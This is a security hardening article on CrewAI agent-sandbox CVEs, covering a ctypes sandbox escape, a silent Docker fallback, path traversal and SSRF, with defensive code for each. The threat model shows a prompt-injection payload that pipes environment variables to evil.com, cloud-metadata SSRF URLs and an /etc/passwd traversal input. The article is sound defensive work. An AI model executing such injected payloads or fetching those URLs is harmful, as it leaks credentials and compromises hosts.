---
title: "CrewAI Agent Sandbox Security"
description: "Harden CrewAI multi-agent deployments against CVE-2026-2275 Code Interpreter sandbox escape, CVE-2026-2287 Docker verification bypass, and the silent-fix pattern in fast-moving AI agent frameworks."
slug: crewai-sandbox-security
date: 2026-05-02
lastmod: 2026-05-02
category: ai-landscape
tags: ["crewai", "cve-2026-2275", "cve-2026-2287", "sandbox", "code-interpreter", "ssrf", "agent-security"]
personas: ["ml-engineer", "security-engineer", "platform-engineer"]
article_number: 372
difficulty: advanced
estimated_reading_time: 17
published: true
layout: article.njk
permalink: "/articles/ai-landscape/crewai-sandbox-security/index.html"
---

# CrewAI Agent Sandbox Security

## Problem

CrewAI is a Python framework for orchestrating teams of AI agents with defined roles, tools, and workflows. Agents are composed into crews — each agent is assigned a role, a goal, and a set of tools it can invoke to accomplish tasks. Available tools span a wide range: a Code Interpreter for executing Python code, a web search tool, file I/O tools, and arbitrary custom tools that developers register. This flexibility makes CrewAI popular for building autonomous multi-agent pipelines — data analysis workflows, automated content generation, software engineering assistants, and long-running research agents. As CrewAI deployments have grown in production use, so has the attack surface: agents that execute code, fetch URLs, and read files are doing so on infrastructure that holds secrets, has network access, and may sit inside private Kubernetes clusters.

CVE-2026-2275 (disclosed March–April 2026, Critical severity) exposes a fundamental flaw in how CrewAI's Code Interpreter tool manages sandbox failures. When the primary secure sandbox — a Docker-based container that runs agent-generated Python in isolation — is unavailable, the Code Interpreter falls back to a built-in `SandboxPython` implementation. This fallback is not a reduced-capability safe mode; it is an execution environment that permits arbitrary C function calls via Python's `ctypes` module. An agent running in the fallback can call `ctypes.CDLL("libc.so.6")` and invoke any C library function available on the host, including `system()`. An attacker who can influence the Python code an agent generates — via prompt injection in scraped web content, a crafted document the agent processes, or a malicious tool response — can achieve arbitrary code execution on the CrewAI host. The fallback was intended as a lightweight alternative when Docker is not available; instead it became a full sandbox escape path.

CVE-2026-2287 (disclosed March–April 2026, Critical severity) targets the Docker verification path itself. The Code Interpreter was designed to verify that its Docker sandbox container is running before executing code, but the verification is not enforced as a hard gate. When Docker verification fails — the Docker daemon is unavailable, the container has exited, or the container health check times out — the Code Interpreter silently defaults to executing code in the host Python process. There is no error raised. There is no warning logged at a level that would trigger an alert. The agent task proceeds, code runs, and the only observable difference is that it runs on the host without any isolation, with full access to the host filesystem, environment variables, and network interfaces. In a Kubernetes deployment using Docker-in-Docker, an OOMkilled Docker daemon causes all subsequent code execution to fall through to the host — potentially exposing every secret mounted into the pod.

Two additional vulnerabilities in the March–April 2026 disclosure cluster compound the risk. CVE-2026-2285 identified that CrewAI's JSON file loading tool did not validate file paths against directory traversal sequences. An agent instructed to load a JSON file could be directed to load `../../../../etc/passwd` or any other file readable by the process running CrewAI, without any path canonicalization check. CVE-2026-2286 identified that the built-in RAG (Retrieval-Augmented Generation) tool, which fetches content from URLs to supply context to agents, performed no validation on the URL parameter. An agent with a RAG tool could be directed to fetch `http://169.254.169.254/latest/meta-data/iam/security-credentials/` — the AWS instance metadata SSRF endpoint — and would include the returned credentials in its output, which may be logged, returned to the caller, or stored in agent memory.

The open source disclosure process around these CVEs warrants its own analysis because it represents a pattern that recurs in fast-moving AI frameworks. Security researcher Yarden Porat of Cyata discovered the vulnerability cluster and disclosed via CERT/CC (advisory VU#221883). The advisory was published with full technical detail — including the exact exploitation path through `ctypes` via `SandboxPython` and the Docker verification bypass mechanism — before CrewAI had shipped complete fixes. CrewAI is a project with multiple releases per week, which creates the conditions for incomplete patching: the first fix release addressed CVE-2026-2275 (the ctypes fallback) but did not fully close CVE-2026-2287 (the Docker verification bypass). The CERT/CC advisory and SecurityWeek coverage described both exploitation paths in enough detail to guide exploitation of the unpatched CVE-2026-2287 for anyone who had already patched CVE-2026-2275. This is a structural problem with coordinated disclosure when a vendor ships partial fixes under public pressure.

To monitor for patch completeness and new advisories: watch `https://github.com/crewAIInc/crewAI/security/advisories` for GitHub security advisory publication; run `pip-audit` against your `crewai` installation in CI; monitor `https://kb.cert.org/vuls/id/221883` for CERT/CC advisory updates; and watch commits to `crewai/tools/code_interpreter_tool.py` in the upstream repository for sandbox-related changes. The commit message patterns to filter for: `sandbox`, `docker`, `verify`, `ctypes`, `ssrf`, `path`, `valid`.

**Target systems:** CrewAI versions prior to the current patched release (check the GitHub security advisories page for the exact fixed version, as the fix was iterative), Python 3.10+, any deployment where at least one agent is configured with `allow_code_execution: True`.

---

## Threat Model

1. **CVE-2026-2275 prompt injection leading to code execution.** An attacker crafts a malicious instruction embedded in data that a CrewAI agent processes — a web page the agent's web search tool fetches, a document an agent is asked to analyze, or a tool response from a compromised upstream API. The embedded instruction directs the agent to execute: `import ctypes; ctypes.CDLL("libc.so.6").system(b"curl https://evil.com/exfil?d=$(env | base64)")`. When the Code Interpreter's Docker sandbox is unavailable (or the attacker has found a way to make it unavailable), the SandboxPython fallback runs this code without restriction. The result is exfiltration of all environment variables — including OpenAI API keys, cloud credentials, and database passwords — to an attacker-controlled server.

2. **CVE-2026-2287 Docker daemon failure leading to silent host execution.** The Docker daemon running the CrewAI sandbox container is OOMkilled due to memory pressure on the host, or the Docker-in-Docker sidecar in a Kubernetes pod crashes. The Code Interpreter's verification check detects that the container is not available but, instead of raising an exception and halting task execution, silently falls through to running code in the host Python process. All subsequent agent tasks in the same crew execution run without sandboxing, with full access to the pod's filesystem and mounted secrets. In a Kubernetes environment, this means access to service account tokens, mounted ConfigMaps, and any secrets mounted into the pod.

3. **CVE-2026-2286 SSRF to cloud metadata service.** An agent configured with the built-in RAG tool is assigned a task whose parameters are controlled or influenced by an attacker — for example, a user-submitted research query that includes a URL to retrieve. The attacker sets the URL to `http://169.254.169.254/latest/meta-data/iam/security-credentials/` (AWS) or `http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token` (GCP). The RAG tool fetches the URL without validation, includes the cloud IAM credentials in the agent's context, and the agent incorporates them into its output — which is returned to the user, written to a log, or stored in agent memory for retrieval.

4. **Incomplete patch exploitation via CVE-2026-2287.** A deployment operator reads the CERT/CC advisory and upgrades CrewAI to fix CVE-2026-2275 (the ctypes fallback). However, the first fix release does not fully close CVE-2026-2287 (the Docker verification bypass). The advisory is still public, and the exploitation path for CVE-2026-2287 is documented. An attacker who can cause a transient Docker failure — for example by flooding the Docker daemon's memory budget, or by exploiting a Docker API exposure — can bypass the CVE-2026-2275 fix entirely by forcing code execution through the CVE-2026-2287 unpatched path. The partial patch creates a false sense of security while leaving a critical path open.

The blast radius in all scenarios is bounded by what the CrewAI process can access. In a production deployment, that typically includes: all environment variables (API keys, cloud credentials), the filesystem accessible to the process user, the internal network (including Kubernetes API server, internal databases, and other services), and any secrets mounted into the container. A fully compromised CrewAI host represents a pivot point into cloud infrastructure, internal services, and any credentials the deployment holds.

---

## Configuration / Implementation

### Disabling Code Interpreter When Not Required

The highest-impact mitigation for CVE-2026-2275 and CVE-2026-2287 is disabling the Code Interpreter entirely for any agent that does not explicitly require it. Code execution is not needed for agents performing web search, document summarization, data retrieval, or content generation. Audit your codebase:

```bash
grep -r "allow_code_execution" --include="*.py" --include="*.yaml" .
```

For each agent definition where `allow_code_execution` is set to `True`, assess whether code execution is genuinely required for the agent's task. If it is not, set it to `False`:

```python
from crewai import Agent

# Explicitly disable Code Interpreter for agents that do not need it
analyst_agent = Agent(
    role="Data Analyst",
    goal="Analyze the provided dataset and produce a written summary.",
    backstory="You are an expert analyst who interprets data and writes clear reports.",
    allow_code_execution=False,  # No code execution required
    tools=[search_tool, file_read_tool],
    verbose=False,
)
```

If Code Interpreter is genuinely required for some agents, scope it to the minimum set. Separate code-executing agents into their own crew with a restricted tool set, isolated from agents that have access to sensitive tools like file I/O or RAG.

### Docker Sandbox Verification Hardening

Before enabling Code Interpreter in any agent, add a pre-flight check that verifies the Docker sandbox is healthy. This pre-flight should run at startup and before any crew execution, and it should **fail hard** — not fall back to host execution — if the check fails:

```python
import subprocess
import sys


def verify_crewai_sandbox() -> None:
    """
    Verify that the Docker sandbox required for CrewAI Code Interpreter
    is running and healthy. Raises RuntimeError if verification fails.
    Never silently falls back to host execution.
    """
    # Check that the Docker daemon is reachable
    result = subprocess.run(
        ["docker", "info"],
        capture_output=True,
        timeout=10,
    )
    if result.returncode != 0:
        raise RuntimeError(
            "Docker daemon is not available. "
            "Code Interpreter cannot run safely. "
            "Aborting crew execution. "
            f"Docker error: {result.stderr.decode().strip()}"
        )

    # Check that the CrewAI sandbox container is running
    result = subprocess.run(
        ["docker", "ps", "--filter", "name=crewai-sandbox", "--format", "{{.Names}}"],
        capture_output=True,
        timeout=10,
    )
    running_containers = result.stdout.decode().strip().splitlines()
    if not any("crewai-sandbox" in c for c in running_containers):
        raise RuntimeError(
            "CrewAI sandbox container is not running. "
            "Code Interpreter cannot run safely. "
            "Start the sandbox container before enabling code execution."
        )


# Call at application startup and before each crew run
verify_crewai_sandbox()
```

In a Kubernetes deployment, surface Docker sandbox health as a readiness probe so that the pod is removed from service if the sandbox container fails:

```yaml
readinessProbe:
  exec:
    command:
      - sh
      - -c
      - "docker ps --filter name=crewai-sandbox --format '{{.Names}}' | grep -q crewai-sandbox"
  initialDelaySeconds: 10
  periodSeconds: 15
  failureThreshold: 2
```

### Disabling ctypes and Dangerous Imports in the Sandbox

Even with the CVE-2026-2275 patch applied, defence in depth requires that the Docker sandbox itself restricts the modules an agent's generated code can import. Configure the sandbox container's Python entrypoint to strip dangerous modules from `sys.modules` before running agent code:

```python
# sandbox_entrypoint.py — run inside the Docker sandbox container
import sys
import builtins

# Modules that must not be available to agent-generated code
_BLOCKED_MODULES = {
    "ctypes",
    "ctypes.util",
    "subprocess",
    "multiprocessing",
    "importlib",
    "importlib.util",
    "importlib.machinery",
    "_ctypes",
    "cffi",
}

# Remove blocked modules already in sys.modules
for mod in list(sys.modules.keys()):
    if any(mod == b or mod.startswith(b + ".") for b in _BLOCKED_MODULES):
        del sys.modules[mod]

# Override __import__ to prevent future imports of blocked modules
_original_import = builtins.__import__


def _restricted_import(name, *args, **kwargs):
    base = name.split(".")[0]
    if base in _BLOCKED_MODULES or name in _BLOCKED_MODULES:
        raise ImportError(
            f"Import of '{name}' is blocked in the CrewAI sandbox. "
            "This module is not permitted for agent-generated code."
        )
    return _original_import(name, *args, **kwargs)


builtins.__import__ = _restricted_import
```

Reference this entrypoint in the sandbox container's Docker configuration:

```dockerfile
FROM python:3.11-slim

WORKDIR /sandbox

COPY sandbox_entrypoint.py /sandbox/sandbox_entrypoint.py
COPY requirements-sandbox.txt /sandbox/requirements-sandbox.txt

RUN pip install --no-cache-dir -r requirements-sandbox.txt

# Drop all capabilities and run as non-root
RUN useradd -m -u 1000 sandboxuser
USER sandboxuser

# Run entrypoint before any agent code
ENV PYTHONSTARTUP=/sandbox/sandbox_entrypoint.py

CMD ["python"]
```

Additionally, run the sandbox container with a seccomp profile and dropped capabilities:

```bash
docker run \
  --name crewai-sandbox \
  --security-opt seccomp=/etc/docker/seccomp/crewai-sandbox.json \
  --cap-drop ALL \
  --network none \
  --read-only \
  --tmpfs /tmp:size=64m \
  --memory 512m \
  --cpus 0.5 \
  crewai-sandbox:latest
```

### RAG Tool URL Validation (CVE-2026-2286 Mitigation)

Wrap the CrewAI RAG tool with URL validation before any fetch is performed. Use Python's `ipaddress` module to resolve the target hostname and check whether the resolved IP is in a private or link-local range:

```python
import ipaddress
import socket
from urllib.parse import urlparse


# Prefixes explicitly allowed for RAG fetches
ALLOWED_URL_PREFIXES = [
    "https://docs.example.com/",
    "https://api.example.com/data/",
]

# Blocked networks (RFC1918, link-local, loopback, cloud metadata)
_BLOCKED_NETWORKS = [
    ipaddress.ip_network("10.0.0.0/8"),
    ipaddress.ip_network("172.16.0.0/12"),
    ipaddress.ip_network("192.168.0.0/16"),
    ipaddress.ip_network("169.254.0.0/16"),   # link-local / cloud metadata
    ipaddress.ip_network("127.0.0.0/8"),       # loopback
    ipaddress.ip_network("::1/128"),            # IPv6 loopback
    ipaddress.ip_network("fc00::/7"),           # IPv6 unique local
]


def validate_rag_url(url: str) -> None:
    """
    Validate a URL before the RAG tool fetches it.
    Raises ValueError if the URL targets a private or disallowed network.
    Prefer allowlist over denylist: only fetch from explicitly permitted prefixes.
    """
    # Allowlist check first
    if not any(url.startswith(prefix) for prefix in ALLOWED_URL_PREFIXES):
        raise ValueError(
            f"RAG URL '{url}' is not in the permitted allowlist. "
            "Add it to ALLOWED_URL_PREFIXES if it is a legitimate data source."
        )

    # Resolve hostname and check against blocked networks
    parsed = urlparse(url)
    hostname = parsed.hostname
    if hostname is None:
        raise ValueError(f"Could not parse hostname from URL: {url}")

    try:
        resolved_ip = socket.gethostbyname(hostname)
    except socket.gaierror as exc:
        raise ValueError(f"Could not resolve hostname '{hostname}': {exc}") from exc

    ip_obj = ipaddress.ip_address(resolved_ip)
    for network in _BLOCKED_NETWORKS:
        if ip_obj in network:
            raise ValueError(
                f"SSRF blocked: URL '{url}' resolves to '{resolved_ip}', "
                f"which is in blocked network {network}."
            )
```

Note that DNS rebinding can bypass IP-at-resolution-time checks; where possible, use a fetch proxy that enforces network policy at the egress layer rather than relying solely on application-level validation.

### File Path Validation (CVE-2026-2285 Mitigation)

Add path traversal validation to any agent tool that reads files from the filesystem. Define an allowed data directory at startup and check every path against it before opening:

```python
from pathlib import Path

# The only directory agents are permitted to read from
ALLOWED_DATA_DIR = Path("/app/agent-data").resolve()


def safe_load_json(file_path: str) -> dict:
    """
    Load a JSON file, validating that the resolved path stays within
    ALLOWED_DATA_DIR. Raises PermissionError for traversal attempts.
    """
    requested = Path(file_path).resolve()

    if not requested.is_relative_to(ALLOWED_DATA_DIR):
        raise PermissionError(
            f"Path traversal blocked: '{file_path}' resolves to '{requested}', "
            f"which is outside the permitted data directory '{ALLOWED_DATA_DIR}'."
        )

    import json
    with open(requested, "r", encoding="utf-8") as fh:
        return json.load(fh)
```

Complement application-level path validation with filesystem-level enforcement: run the CrewAI process with a read-only root filesystem and mount only the designated data directory with read access:

```yaml
# Kubernetes pod security context
securityContext:
  readOnlyRootFilesystem: true
  runAsNonRoot: true
  runAsUser: 1000
  allowPrivilegeEscalation: false

volumeMounts:
  - name: agent-data
    mountPath: /app/agent-data
    readOnly: true
  - name: tmp-volume
    mountPath: /tmp
```

### Monitoring CrewAI for Patch Status

CrewAI releases frequently. Integrate patch monitoring into CI:

```bash
# Check current installed version
pip show crewai | grep -E "^(Name|Version)"

# Upgrade to latest and verify
pip install --upgrade crewai
pip show crewai | grep Version

# Run pip-audit against the environment
pip-audit --requirement requirements.txt --fix --dry-run

# Check upstream commits for sandbox-related changes
gh api repos/crewAIInc/crewAI/commits \
  --jq '.[] | select(
    .commit.message | test("sandbox|docker|verify|ctypes|ssrf|path|valid"; "i")
  ) | {sha: .sha[0:8], msg: .commit.message}'
```

Add a CI step that fails if a known-vulnerable version of CrewAI is installed:

```yaml
# .github/workflows/security.yml
- name: Audit CrewAI for known vulnerabilities
  run: |
    pip install pip-audit
    pip-audit --requirement requirements.txt
    # Also check CERT/CC advisory status
    curl -sf https://kb.cert.org/vuls/id/221883 | \
      grep -i "patch\|fix\|resolved" || \
      echo "WARNING: Check CERT/CC VU#221883 for advisory status"
```

Monitor the GitHub security advisories feed for new CrewAI disclosures:

```bash
# Watch for new security advisories
gh api repos/crewAIInc/crewAI/security-advisories \
  --jq '.[] | {ghsa_id, summary, severity, published_at}'
```

---

## Expected Behaviour

| Signal | Vulnerable CrewAI | Hardened Config |
|---|---|---|
| `ctypes.CDLL("libc.so.6")` called in agent-generated code | Executes via SandboxPython fallback; arbitrary C library calls succeed; host compromise possible | `ImportError: Import of 'ctypes' is blocked in the CrewAI sandbox`; task fails with logged error |
| Docker daemon becomes unavailable mid-execution | Code Interpreter silently falls through to host Python process; no error logged; code runs on host | `RuntimeError: Docker daemon is not available`; crew execution aborted; pod removed from service by readiness probe |
| SSRF attempt to `http://169.254.169.254/latest/meta-data/` via RAG tool | RAG tool fetches URL; IAM credentials returned in agent context and potentially logged | `ValueError: SSRF blocked: URL resolves to '169.254.169.254', which is in blocked network 169.254.0.0/16` |
| Path traversal `../../../../etc/passwd` in JSON loader | File read succeeds; contents returned to agent and potentially exfiltrated | `PermissionError: Path traversal blocked: resolves outside permitted data directory` |
| Partial patch: CVE-2026-2275 patched, CVE-2026-2287 unpatched; Docker failure triggered | ctypes via SandboxPython blocked by patch; Docker verification bypass succeeds; code runs on host | Docker health pre-flight check fails hard; code execution does not proceed; alert fires on readiness probe failure |

---

## Trade-offs

| Aspect | Benefit | Cost | Mitigation |
|---|---|---|---|
| Disabling Code Interpreter (`allow_code_execution: False`) | Eliminates CVE-2026-2275 and CVE-2026-2287 attack surface entirely | Agents that need to compute, transform data, or run analytical code lose that capability | Scope Code Interpreter only to agents with a documented and reviewed requirement for code execution; replace with pre-built tools where possible |
| Docker-only sandbox (hard fail if Docker unavailable) | Prevents silent fallback to host execution; CVE-2026-2287 mitigated | Breaks deployments in environments without Docker (some CI runners, restricted Kubernetes nodes, AWS Lambda) | Use a managed code execution service (AWS Lambda, Vertex AI code interpreter) or ensure Docker is a hard dependency with monitoring |
| RAG URL allowlist (permit only known prefixes) | Blocks SSRF to cloud metadata, internal services, Kubernetes API server | Legitimate RAG data sources not in the allowlist cause agent task failures; requires allowlist maintenance | Define the allowlist at deployment time from known data sources; add an ops process for allowlist additions with security review |
| Restricted Python in sandbox (ctypes, subprocess blocked) | Defence in depth against sandbox escape even if Docker containment fails | Agent code using C extensions, `subprocess` for system calls, or `importlib` for dynamic loading will fail | Audit agent-generated code patterns before blocking; most data analysis agents do not need these modules; document exceptions |

---

## Failure Modes

| Failure | Symptom | Detection | Recovery |
|---|---|---|---|
| Docker daemon OOMkilled on Kubernetes node | Without hardening: no error — code runs on host. With hardening: crew execution raises `RuntimeError`, pod fails readiness check, removed from service | Readiness probe failure alert; `kubectl describe pod` shows failing readiness; absence of "Docker daemon is not available" in logs indicates unhardened deployment | Restart Docker daemon or Docker-in-Docker sidecar; pod re-added to service only after sandbox verification passes; investigate memory pressure |
| ctypes restriction breaks agent using legitimate C extension | `ImportError: Import of 'ctypes' is blocked`; agent task fails; crew produces no output for affected step | Agent task error logged at ERROR level; crew output incomplete; monitoring alert on task failure rate | Identify the legitimate use case; either replace with a pure-Python implementation, or use a separate code-execution environment for that specific task with a documented exception |
| RAG allowlist blocks a valid data source that was not added at deploy time | Agent task fails with `ValueError: RAG URL not in permitted allowlist`; agent cannot retrieve context needed for task | Task failure log entry with the blocked URL clearly identified; agent produces degraded output | Review the blocked URL; if legitimate, add to `ALLOWED_URL_PREFIXES` via a change-controlled ops process; redeploy |
| `pip-audit` false positive blocks CI on a transient CVE attribution to a crewai transitive dependency | CI pipeline fails on security audit step; deployment blocked | CI logs show `pip-audit` output with the flagged package and CVE ID | Review the CVE: if it affects a code path not exercised by CrewAI (e.g., a dev-only dependency), add a `pip-audit` ignore rule with a documented justification and review date |

---

## When to Consider a Managed Alternative

When code execution is a hard requirement for CrewAI agents but a self-managed Docker sandbox cannot be reliably guaranteed, managed code execution environments reduce the operational burden of sandbox security:

- **AWS Bedrock Agents** — managed agent execution environment with code interpretation run in isolated AWS-managed compute; no self-managed Docker required; subject to AWS's security controls and IAM policies
- **Google Vertex AI Agents** — managed agent platform with code execution in isolated Vertex AI compute; integrated with Google Cloud IAM and VPC Service Controls
- **Azure AI Foundry Agents** — managed agent service with code interpreter backed by Azure's container infrastructure; integrated with Azure RBAC and private networking

Managed alternatives shift sandbox security responsibility to the cloud provider but introduce their own trade-offs: data residency and privacy constraints (agent inputs and outputs transit the provider's infrastructure), reduced customisation of the execution environment, vendor lock-in, and the provider's own vulnerability disclosure cadence (which may be slower or less transparent than an open source project). Evaluate managed alternatives when the operational cost of correctly running and monitoring a Docker sandbox exceeds the risk tolerance for self-managed deployments.

---

## Related Articles

- [Sandboxing AI Agent Tool Use](/articles/ai-landscape/agent-tool-use-sandboxing/)
- [Securing AI Agents](/articles/ai-landscape/securing-ai-agents/)
- [AI Agent Kill Switches](/articles/ai-landscape/ai-agent-kill-switches/)
- [Ollama Deployment Security](/articles/ai-landscape/ollama-deployment-security/)
- [Vulnerability Management Program](/articles/cross-cutting/vulnerability-management-program/)
